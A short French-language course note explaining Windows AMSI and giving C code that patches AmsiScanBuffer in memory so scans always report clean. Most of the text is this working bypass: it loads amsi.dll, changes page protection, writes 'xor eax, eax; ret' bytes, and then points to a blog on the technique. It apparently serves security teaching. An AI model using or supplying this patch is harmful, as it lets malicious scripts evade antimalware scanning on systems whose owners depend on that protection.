# Cours : AMSI Bypass - Contourner Antimalware Scan Interface

## 1. Introduction

**AMSI** = Interface de scan antimalware intégrée à Windows (PowerShell, VBScript, etc.).

## 2. Fonctionnement

```ascii
Script PowerShell exécuté :
    ↓
AMSI scanne le contenu
    ↓
Si malveillant → Bloqué
Si bénin → Exécuté
```

## 3. Bypass - Patcher AmsiScanBuffer

```c
HMODULE amsi = LoadLibraryA("amsi.dll");
LPVOID amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

// Patcher pour retourner toujours AMSI_RESULT_CLEAN
DWORD oldProtect;
VirtualProtect(amsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

// Écrire : xor eax, eax ; ret
*(BYTE*)amsiScanBuffer = 0x31;  // xor
*((BYTE*)amsiScanBuffer + 1) = 0xC0;  // eax, eax
*((BYTE*)amsiScanBuffer + 2) = 0xC3;  // ret

VirtualProtect(amsiScanBuffer, 8, oldProtect, &oldProtect);
```

## Ressources

- [AMSI Bypass](https://www.contextis.com/en/blog/amsi-bypass)

